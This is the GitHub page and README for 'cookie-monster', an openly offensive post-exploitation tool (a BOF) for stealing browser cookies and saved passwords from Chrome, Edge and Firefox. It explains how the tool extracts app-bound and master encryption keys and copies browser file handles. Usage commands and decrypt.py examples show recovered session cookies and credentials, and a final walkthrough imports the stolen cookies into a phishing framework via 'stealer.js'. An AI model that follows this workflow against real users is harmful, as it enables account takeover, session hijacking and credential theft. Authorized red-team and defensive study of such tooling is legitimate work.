# https://github.com/KingOfTheNOPs/cookie-monster

[Skip to content](https://github.com/KingOfTheNOPs/cookie-monster#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/KingOfTheNOPs/cookie-monster) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/KingOfTheNOPs/cookie-monster) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/KingOfTheNOPs/cookie-monster) to refresh your session.Dismiss alert

{{ message }}

[KingOfTheNOPs](https://github.com/KingOfTheNOPs)/ **[cookie-monster](https://github.com/KingOfTheNOPs/cookie-monster)** Public

- [Notifications](https://github.com/login?return_to=%2FKingOfTheNOPs%2Fcookie-monster) You must be signed in to change notification settings
- [Fork\\
46](https://github.com/login?return_to=%2FKingOfTheNOPs%2Fcookie-monster)
- [Star\\
497](https://github.com/login?return_to=%2FKingOfTheNOPs%2Fcookie-monster)


BOF to steal browser cookies & credentials


### License

[GPL-3.0 license](https://github.com/KingOfTheNOPs/cookie-monster/blob/main/LICENSE)

[497\\
stars](https://github.com/KingOfTheNOPs/cookie-monster/stargazers) [46\\
forks](https://github.com/KingOfTheNOPs/cookie-monster/forks) [Branches](https://github.com/KingOfTheNOPs/cookie-monster/branches) [Tags](https://github.com/KingOfTheNOPs/cookie-monster/tags) [Activity](https://github.com/KingOfTheNOPs/cookie-monster/activity)

[Star](https://github.com/login?return_to=%2FKingOfTheNOPs%2Fcookie-monster)

[Notifications](https://github.com/login?return_to=%2FKingOfTheNOPs%2Fcookie-monster) You must be signed in to change notification settings

# KingOfTheNOPs/cookie-monster

main

[Branches](https://github.com/KingOfTheNOPs/cookie-monster/branches) [Tags](https://github.com/KingOfTheNOPs/cookie-monster/tags)

[Go to Branches page](https://github.com/KingOfTheNOPs/cookie-monster/branches)[Go to Tags page](https://github.com/KingOfTheNOPs/cookie-monster/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>## History<br>[65 Commits](https://github.com/KingOfTheNOPs/cookie-monster/commits/main/) <br>[View commit history for this file.](https://github.com/KingOfTheNOPs/cookie-monster/commits/main/) 65 Commits |
| [.gitignore](https://github.com/KingOfTheNOPs/cookie-monster/blob/main/.gitignore ".gitignore") | [.gitignore](https://github.com/KingOfTheNOPs/cookie-monster/blob/main/.gitignore ".gitignore") |  |  |
| [LICENSE](https://github.com/KingOfTheNOPs/cookie-monster/blob/main/LICENSE "LICENSE") | [LICENSE](https://github.com/KingOfTheNOPs/cookie-monster/blob/main/LICENSE "LICENSE") |  |  |
| [Makefile](https://github.com/KingOfTheNOPs/cookie-monster/blob/main/Makefile "Makefile") | [Makefile](https://github.com/KingOfTheNOPs/cookie-monster/blob/main/Makefile "Makefile") |  |  |
| [README.md](https://github.com/KingOfTheNOPs/cookie-monster/blob/main/README.md "README.md") | [README.md](https://github.com/KingOfTheNOPs/cookie-monster/blob/main/README.md "README.md") |  |  |
| [beacon.h](https://github.com/KingOfTheNOPs/cookie-monster/blob/main/beacon.h "beacon.h") | [beacon.h](https://github.com/KingOfTheNOPs/cookie-monster/blob/main/beacon.h "beacon.h") |  |  |
| [cookie-monster-bof.c](https://github.com/KingOfTheNOPs/cookie-monster/blob/main/cookie-monster-bof.c "cookie-monster-bof.c") | [cookie-monster-bof.c](https://github.com/KingOfTheNOPs/cookie-monster/blob/main/cookie-monster-bof.c "cookie-monster-bof.c") |  |  |
| [cookie-monster-bof.h](https://github.com/KingOfTheNOPs/cookie-monster/blob/main/cookie-monster-bof.h "cookie-monster-bof.h") | [cookie-monster-bof.h](https://github.com/KingOfTheNOPs/cookie-monster/blob/main/cookie-monster-bof.h "cookie-monster-bof.h") |  |  |
| [cookie-monster.cna](https://github.com/KingOfTheNOPs/cookie-monster/blob/main/cookie-monster.cna "cookie-monster.cna") | [cookie-monster.cna](https://github.com/KingOfTheNOPs/cookie-monster/blob/main/cookie-monster.cna "cookie-monster.cna") |  |  |
| [decrypt.py](https://github.com/KingOfTheNOPs/cookie-monster/blob/main/decrypt.py "decrypt.py") | [decrypt.py](https://github.com/KingOfTheNOPs/cookie-monster/blob/main/decrypt.py "decrypt.py") |  |  |
| [requirements.txt](https://github.com/KingOfTheNOPs/cookie-monster/blob/main/requirements.txt "requirements.txt") | [requirements.txt](https://github.com/KingOfTheNOPs/cookie-monster/blob/main/requirements.txt "requirements.txt") |  |  |
| View all files |

## Repository files navigation

# Cookie-Monster-BOF

[Permalink: Cookie-Monster-BOF](https://github.com/KingOfTheNOPs/cookie-monster#cookie-monster-bof)

Steal browser cookies for edge, chrome and firefox through a BOF!

Cookie Monster BOF will extract the WebKit Master Key and the App Bound Encryption Key for both Edge and Chrome, locate a browser process with a handle to the Cookies and Login Data files, copy the handle(s) and then filelessly download the target file(s).

Once the Cookies/Login Data file(s) are downloaded, the python decryption script can be used to extract those secrets! Firefox module will parse the profiles.ini and locate where the logins.json and key4.db files are located and download them. A seperate github repo is referenced for offline decryption.

Chrome & Edge 127+ Updates: new chromium browser cookies (v20) use the app bound key to encrypt the cookies. As a result, this makes retrieving the app\_bound\_encrypted\_key slightly more difficult. Thanks to [snovvcrash](https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824) this process can be accomplished without having to escalate your privileges. The catch is your process must be running out of the web browser's application directory. i.e. must inject into Chrome/Edge or spawn a beacon from the same application directory as the browser.

Decrypt cookies as SYSTEM and without having to inject into the browser process! Shoutout to @sdemius for the discovering how to decrypt the Chrome's [PostProcessData](https://source.chromium.org/chromium/chromium/src/+/main:chrome/elevation_service/elevator.cc;l=216;bpv=1) function and @b1scoito [explanation](https://github.com/moonD4rk/HackBrowserData/issues/431#issuecomment-2606665195)! Chrome 137+ changed the PostProcessData() function once again, shoutout to [@runassu](https://github.com/runassu/chrome_v20_decryption) for figuring it out!

Latest update added decryption of Webkit Master Key thanks to @M1ndo. The master key is automatically decrypted along side the app bound key. To utilize it, add the key to the Python decrypt script. Primarily see this key used when roaming profiles are in use, stored passwords in Edge, or older stored passwords.

## BOF Usage

[Permalink: BOF Usage](https://github.com/KingOfTheNOPs/cookie-monster#bof-usage)

```
Usage: cookie-monster [--chrome || --edge || --system <Local State File Path> <PID> || --firefox || --chromeCookiePID <PID> || --chromeLoginDataPID <PID> || --edgeCookiePID <PID> || --edgeLoginDataPID <PID> ] [--cookie-only] [--key-only] [--login-data-only] [--copy-file "C:\Folder\Location\"]
cookie-monster Examples:
   cookie-monster --chrome
   cookie-monster --edge
   cookie-monster --system "C:\Users\<USER>\AppData\Local\<BROWSER>\User Data\Local State" <PID>
   cookie-moster --firefox
   cookie-monster --chromeCookiePID <PID>
   cookie-monster --chromeLoginDataPID <PID>
   cookie-monster --edgeCookiePID <PID>
   cookie-monster --edgeLoginDataPID <PID>
cookie-monster Options:
    --chrome, looks at all running processes and handles, if one matches chrome.exe it copies the handle to cookies and then copies the file to the CWD
    --edge, looks at all running processes and handles, if one matches msedge.exe it copies the handle to cookies and then copies the file to the CWD
    --system, Decrypt chromium based browser app bound encryption key without injecting into browser. Requires path to Local State file and PID of a user process for impersonation
    --firefox, looks for profiles.ini and locates the key4.db and logins.json file
    --chromeCookiePID, if chrome PID is provided look for the specified process with a handle to cookies is known, specifiy the pid to duplicate its handle and file
    --chromeLoginDataPID, if chrome PID is provided look for the specified process with a handle to Login Data is known, specifiy the pid to duplicate its handle and file
    --edgeCookiePID, if edge PID is provided look for the specified process with a handle to cookies is known, specifiy the pid to duplicate its handle and file
    --edgeLoginDataPID, if edge PID is provided look for the specified process with a handle to Login Data is known, specifiy the pid to duplicate its handle and file
    --key-only, only retrieve the app bound encryption key. Do not attempt to download the Cookie or Login Data files.
    --cookie-only, only retrieve the Cookie file. Do not attempt to download Login Data file or retrieve app bound encryption key.
    --login-data-only, only retrieve the Login Data file. Do not attempt to download Cookie file or retrieve app bound encryption key.
    --copy-file, copies the Cookie and Login Data file to the folder specified. Does not use fileless retrieval method.
```

## Compile BOF

[Permalink: Compile BOF](https://github.com/KingOfTheNOPs/cookie-monster#compile-bof)

Ensure Mingw-w64 and make is installed on the linux prior to compiling.

```
make
```

## Decryption Steps

[Permalink: Decryption Steps](https://github.com/KingOfTheNOPs/cookie-monster#decryption-steps)

Install requirements

```
pip3 install -r requirements.txt
```

Usage

```
python3 decrypt.py -h
usage: decrypt.py [-h] -k KEY -o {cookies,passwords,cookie-editor,cuddlephish,firefox} -f FILE [--chrome-aes-key CHROME_AES_KEY]

Decrypt Chromium cookies and passwords given a key and DB file

options:
  -h, --help            show this help message and exit
  -k KEY, --key KEY     Decryption key
  -o {cookies,passwords,cookie-editor,cuddlephish,firefox}, --option {cookies,passwords,cookie-editor,cuddlephish,firefox}
                        Option to choose
  -f FILE, --file FILE  Location of the database file
  --chrome-aes-key CHROME_AES_KEY
                        Chrome AES Key
  -mk MASTER_KEY, --master-key MASTER_KEY
                        Old key used in v10 passwords
```

Examples:
Decrypt Chrome/Edge Cookies File

```
python .\decrypt.py -k "\xec\xfc...." -o cookies -f ChromeCookies.db

Results Example:
-----------------------------------
Host: .github.com
Path: /
Name: dotcom_user
Cookie: KingOfTheNOPs
Expires: Oct 28 2024 21:25:22

Host: github.com
Path: /
Name: user_session
Cookie: x123.....
Expires: Nov 11 2023 21:25:22
```

Decrypt Chrome Cookies with Chrome AES Key

```
python3 decrypt.py --chrome-aes-key '\x8e\....' -k "\x03\...." -o cuddlephish -f ChromeCookies.db
Cookies saved to cuddlephish_2025-07-03_01-53-57.json
```

Decrypt Chrome/Edge Cookies File and save to json

```
python .\decrypt.py -k "\xec\xfc...." -o cookie-editor -f ChromeCookies.db
Results Example:
Cookies saved to 2025-04-11_18-06-10_cookies.json
```

Import cookies JSON file with [https://cookie-editor.com/](https://cookie-editor.com/)

Decrypt Chome/Edge Passwords File

```
python3 decrypt.py -o passwords -f EdgePasswords.db -k '\xf9\x...' -mk '\xf3\x..'

URL: https://test.com/
Username: adgf
Password: pass

Results Example:
-----------------------------------
URL: https://test.com/
Username: tester
Password: McTesty
```

Decrypt Firefox Cookies and Stored Credentials:

[https://github.com/lclevy/firepwd](https://github.com/lclevy/firepwd)

### CuddlePhish Support

[Permalink: CuddlePhish Support](https://github.com/KingOfTheNOPs/cookie-monster#cuddlephish-support)

added cuddlephish option to the decrypt script which should support using the cookie with [https://github.com/fkasler/cuddlephish](https://github.com/fkasler/cuddlephish)

```
# Decrypt Cookies
python3 decrypt.py -k "\xec\xfc..." -o cuddlephish -f ChromeCookies.db

# Clone Project
cd
git clone https://github.com/fkasler/cuddlephish
cd cuddlephish

# Install Dependencies Example on Debian
curl -fsSL https://deb.nodesource.com/setup_23.x -o nodesource_setup.sh
sudo -E bash nodesource_setup.sh
sudo apt-get install nodejs
npm install

# Import Cookies
cp ~/cookie-monster/cuddlephish_YYYY-MM-DD_HH-MM-SS.json .
node stealer.js cuddlephish_YYYY-MM-DD_HH-MM-SS.json
```

## References

[Permalink: References](https://github.com/KingOfTheNOPs/cookie-monster#references)

This project could not have been done without the help of Mr-Un1k0d3r and his amazing seasonal videos!
Highly recommend checking out his lessons!!!

Cookie Webkit Master Key Extractor:
[https://github.com/Mr-Un1k0d3r/Cookie-Graber-BOF](https://github.com/Mr-Un1k0d3r/Cookie-Graber-BOF)

Fileless download:
[https://github.com/fortra/nanodump](https://github.com/fortra/nanodump)

Decrypt Cookies and Login Data:
[https://github.com/login-securite/DonPAPI](https://github.com/login-securite/DonPAPI)

App Bound Key Decryption:
[https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824](https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824)

Decrypt Chrome 137+ Cookies
[https://github.com/runassu/chrome\_v20\_decryption](https://github.com/runassu/chrome_v20_decryption)

## About

BOF to steal browser cookies & credentials


### Resources

[Readme](https://github.com/KingOfTheNOPs/cookie-monster#readme-ov-file)

### License

[GPL-3.0 license](https://github.com/KingOfTheNOPs/cookie-monster#GPL-3.0-1-ov-file)

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/KingOfTheNOPs/cookie-monster).

[Activity](https://github.com/KingOfTheNOPs/cookie-monster/activity)

### Stars

[**497**\\
stars](https://github.com/KingOfTheNOPs/cookie-monster/stargazers)

### Watchers

[**9**\\
watching](https://github.com/KingOfTheNOPs/cookie-monster/watchers)

### Forks

[**46**\\
forks](https://github.com/KingOfTheNOPs/cookie-monster/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FKingOfTheNOPs%2Fcookie-monster&report=KingOfTheNOPs+%28user%29)

## [Releases](https://github.com/KingOfTheNOPs/cookie-monster/releases)

No releases published

## [Packages\  0](https://github.com/users/KingOfTheNOPs/packages?repo_name=cookie-monster)

No packages published

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/KingOfTheNOPs/cookie-monster).

## [Contributors\  5](https://github.com/KingOfTheNOPs/cookie-monster/graphs/contributors)

- [![@KingOfTheNOPs](https://avatars.githubusercontent.com/u/59070613?s=64&v=4)](https://github.com/KingOfTheNOPs)
- [![@M1ndo](https://avatars.githubusercontent.com/u/44820142?s=64&v=4)](https://github.com/M1ndo)
- [![@Tw1sm](https://avatars.githubusercontent.com/u/37981031?s=64&v=4)](https://github.com/Tw1sm)
- [![@aggr0cr4g](https://avatars.githubusercontent.com/u/93880195?s=64&v=4)](https://github.com/aggr0cr4g)
- [![@dis0rder0x00](https://avatars.githubusercontent.com/u/53529507?s=64&v=4)](https://github.com/dis0rder0x00)

## Languages

- [C87.1%](https://github.com/KingOfTheNOPs/cookie-monster/search?l=c)
- [Python12.6%](https://github.com/KingOfTheNOPs/cookie-monster/search?l=python)
- [Makefile0.3%](https://github.com/KingOfTheNOPs/cookie-monster/search?l=makefile)

You can’t perform that action at this time.